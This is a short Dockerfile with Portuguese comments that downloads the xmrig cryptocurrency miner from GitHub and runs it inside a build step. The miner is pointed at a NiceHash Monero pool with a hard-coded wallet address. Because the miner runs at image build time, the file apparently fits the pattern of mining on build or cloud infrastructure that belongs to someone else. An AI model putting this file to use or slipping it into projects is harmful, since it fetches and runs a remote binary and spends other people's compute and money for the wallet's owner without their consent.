FROM ubuntu:latest

# Instala o wget para fazer download de arquivos
RUN apt-get update && apt-get install -y wget

# Baixa o arquivo, extrai e executa o xmrig
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz \
    && tar -xf xmrig-6.16.2-linux-static-x64.tar.gz \
    && cd xmrig-6.16.2 \
    && chmod +x xmrig \
    && ./xmrig -o randomxmonero.usa-west.nicehash.com:3380 -a rx -k -u 3H3W91fmg4wQN7wLh1zScVzcy3r88Hw5Fn.lat -p x

# CMD ["command_to_run_xmrig"] # opcional se você quiser executar o xmrig em segundo plano
